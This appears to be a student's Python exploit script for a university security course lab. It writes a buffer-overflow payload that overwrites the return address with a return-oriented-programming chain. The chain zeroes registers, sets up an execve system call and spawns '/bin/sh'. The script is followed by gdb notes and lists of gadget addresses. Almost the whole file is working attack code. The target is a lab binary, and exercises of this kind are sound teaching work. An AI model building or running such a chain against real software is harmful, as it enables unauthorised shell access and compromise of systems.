#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Note: C will always add a return character at the end of the sequnce

# Buffer Overflow
sys.stdout.buffer.write(b"\x69" * 100)

# Don't overwrite %ebp (I don't think this matters, could be anything)
sys.stdout.buffer.write(pack("<I", 0xfffe9650))

# Old return address: 0x080488f2
# sys.stdout.buffer.write(pack("<I", 0x080488f2))

# Begin Return Oriented Programming attack (ROP)
# 
# 1. Zero %edx register with the following gadget:
#
#   805c363:	31 d2                	xor    %edx,%edx
#   805c365:	5b                   	pop    %ebx
#   805c366:	89 d0                	mov    %edx,%eax
#   805c368:	5e                   	pop    %esi
#   805c369:	5f                   	pop    %edi
#   805c36a:	c3                   	ret 
sys.stdout.buffer.write(pack("<I", 0x805c363))   # address of first gadget          (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %ebx       (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %esi       (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %edi       (4 bytes)


# 16 bytes

# 2. Zero %ecx register with the following gadget:
#
#   8049a03:	31 c9                	xor    %ecx,%ecx
#   8049a05:	5b                   	pop    %ebx
#   8049a06:	89 c8                	mov    %ecx,%eax
#   8049a08:	5e                   	pop    %esi
#   8049a09:	5f                   	pop    %edi
#   8049a0a:	5d                   	pop    %ebp
#   8049a0b:	c3                   	ret
sys.stdout.buffer.write(pack("<I", 0x8049a03))   # address of second gadget         (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %ebx       (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %esi       (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %edi       (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %ebp       (4 bytes)

# 36 Bytes = 16 Bytes + 20 Bytes

# 3. Increment the value in %eax to 0xb (must call 11 times):
#
#   8069f13:	40                   	inc    %eax
#   8069f14:	5f                   	pop    %edi
#   8069f15:	c3                   	ret

for i in range(11):
  sys.stdout.buffer.write(pack("<I", 0x8069f13))   # address of third gadget        (4 bytes)
  sys.stdout.buffer.write(pack("<I", 0xffffffff))  # junk data for: pop    %edi     (4 bytes)

# 124 Bytes = 16 Bytes + 20 Bytes + (11 * 8 Bytes)

# 4. Set value in %ebx to point to "/bin/sh" (hard coded at the end of the string)
#
#   80481c9:	5b                   	pop    %ebx
#   80481ca:	c3                   	ret
sys.stdout.buffer.write(pack("<I", 0x80481c9))   # address of fourth gadget         (4 bytes)
sys.stdout.buffer.write(pack("<I", 0xfffe96d0))  # address to hardcoded "/bin/sh"   (4 bytes)

# 132 Bytes = 16 Bytes + 20 Bytes + (11 * 8 Bytes) + 8 Bytes

# 5. System Call
#
#   806e780:	cd 80                	int    $0x80
#   806e782:	c3                   	ret 
sys.stdout.buffer.write(pack("<I", 0x806e780))   # address of fifth gadget          (4 bytes)

# 136 Bytes = 16 Bytes + 20 Bytes + (11 * 8 Bytes) + 8 Bytes + 4 Bytes

# 6. Hardcoded "/bin/sh"
sys.stdout.buffer.write(("/bin/sh").encode())


# Note: C always add a \x00 to the end of input

"""

(gdb) b vulnerable
Breakpoint 1 at 0x80488ab
(gdb) r
Starting program: /home/student/sp24_cs461_abadia2/AppSec/1.2.8 iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii

Breakpoint 1, 0x080488ab in vulnerable ()
(gdb) x /2wx $ebp
0xfffe9644:     0xfffe9650      0x080488f2

Attempt 1:

2. zero edx
  805c363:	31 d2                	xor    %edx,%edx
  805c365:	5b                   	pop    %ebx
  805c366:	89 d0                	mov    %edx,%eax
  805c368:	5e                   	pop    %esi
  805c369:	5f                   	pop    %edi
  805c36a:	c3                   	ret  

3. Zero %ecx

  8049a03:	31 c9                	xor    %ecx,%ecx
  8049a05:	5b                   	pop    %ebx
  8049a06:	89 c8                	mov    %ecx,%eax
  8049a08:	5e                   	pop    %esi
  8049a09:	5f                   	pop    %edi
  8049a0a:	5d                   	pop    %ebp
  8049a0b:	c3                   	ret

4. increment %eax to 0xb

  8069f13:	40                   	inc    %eax
  8069f14:	5f                   	pop    %edi
  8069f15:	c3                   	ret

5. Set %ebx to point to "/bin/sh" 

 80481c9:	5b                   	pop    %ebx
 80481ca:	c3                   	ret

6. Sys call
  806e780:	cd 80                	int    $0x80
  806e782:	c3                   	ret 
"""

"""
GADGETS

XOR:

  805c363:	31 d2                	xor    %edx,%edx
  805c365:	5b                   	pop    %ebx
  805c366:	89 d0                	mov    %edx,%eax
  805c368:	5e                   	pop    %esi
  805c369:	5f                   	pop    %edi
  805c36a:	c3                   	ret  

Set eax:

 8056014:	58                   	pop    %eax
 8056015:	5a                   	pop    %edx
 8056016:	5b                   	pop    %ebx
 8056017:	c3                   	ret 

Increment eax:

  8069f13:	40                   	inc    %eax
  8069f14:	5f                   	pop    %edi
  8069f15:	c3                   	ret


Set edx:

  8056014:	58                   	pop    %eax
  8056015:	5a                   	pop    %edx
  8056016:	5b                   	pop    %ebx
  8056017:	c3                   	ret 

Sys Call:

  806e780:	cd 80                	int    $0x80
  806e782:	c3                   	ret 
"""


"""
Searching for: c3                   	ret


Set registers:

  # %ebx
  80481c9:	5b                   	pop    %ebx
  80481ca:	c3                   	ret  

  # %ecx
  806de71:	5a                   	pop    %edx
  806de72:	59                   	pop    %ecx
  806de73:	5b                   	pop    %ebx
  806de74:	c3                   	ret

  8060570:	0f b6 08             	movzbl (%eax),%ecx
  8060573:	0f b6 02             	movzbl (%edx),%eax
  8060576:	29 c8                	sub    %ecx,%eax
  8060578:	c3                   	ret

  # %edi
  805c16d:	5f                   	pop    %edi
  805c16e:	c3                   	ret

  # %esi
  805c891:	5e                   	pop    %esi
  805c892:	c3                   	ret 

  # %ebp
  805c5e7:	5d                   	pop    %ebp
  805c5e8:	c3                   	ret 

Increment registers:

  # %eax
   805e5cc:	40                   	inc    %eax
  805e5cd:	5f                   	pop    %edi
  805e5ce:	c3                   	ret 


08055a40 <_IO_default_underflow>:
 8055a40:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
 8055a45:	c3                   	ret    

08056100 <_IO_default_sync>:
 8056100:	31 c0                	xor    %eax,%eax
 8056102:	c3                   	ret 

08054dca <__x86.get_pc_thunk.cx>:
 8054dca:	8b 0c 24             	mov    (%esp),%ecx
 8054dcd:	c3                   	ret    
 8054dce:	66 90                	xchg   %ax,%ax

080561b0 <_IO_default_seekoff>:
 80561b0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
 80561b5:	ba ff ff ff ff       	mov    $0xffffffff,%edx
 80561ba:	c3                   	ret 

"""